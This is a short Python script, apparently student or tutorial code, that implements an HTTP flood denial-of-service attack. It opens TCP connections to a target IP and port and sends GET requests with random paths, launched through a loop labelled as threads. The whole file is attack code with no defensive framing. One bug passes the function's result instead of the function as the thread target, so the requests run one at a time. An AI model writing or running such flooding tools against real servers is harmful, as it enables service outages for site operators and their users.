# HTTP flood attack

import random
import socket
import string
import threading
import time

# Create a shared variable for thread counts
thread_num = 0
# Building multiple threds, making sure only one thread is running
thread_num_mutex = threading.Lock()


# Print thread status
def print_status():
    global thread_num
    thread_num_mutex.acquire(True)
    # Keep the data and variables exclusively to current thread and if executed, then we release the lock 
    thread_num += 1
    print("\n " + time.ctime().split(" ")[3] + " " + "[" + str(thread_num) + "] Start sending out the packets...")

    thread_num_mutex.release()


# Generate URL Path
def generate_url_path():
    msg = str(string.ascii_letters + string.digits + string.punctuation)
    data = "".join(random.sample(msg, 5))
    return data


# Perform the request
def flooding(ip, port):
    print_status()
    url_path = generate_url_path() # Like TCP, need to generate large amounts of arbirary website addresses

    # Create a raw socket
    dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Need to build connection with the server  using TCP socket

    try:
        # Open the connection on that raw socket
        dos.connect((ip, port)) # We are client side since we are doing the flooding

        # Send the request according to HTTP specification
        msg = "GET /%s HTTP/1.1\nHost: %s\n\n" % (url_path, ip)
        byt = msg.encode()
        dos.send(byt)

    except socket.error:
        print("\n [ No connection, server might be down ]: " + str(socket.error))

    finally:
        # Shutdown and close the socket
        dos.shutdown(socket.SHUT_RDWR)
        dos.close()


def http_flood_attack(disIP, disPort, num_requests):
    # Assign a thread per request
    ip = disIP
    port = disPort
    all_threads = []
    for i in range(num_requests):
        t1 = threading.Thread(target=flooding(ip, port))
        t1.start()
        all_threads.append(t1)

    # Wait until all threads finished
    for current_thread in all_threads:
        current_thread.join()
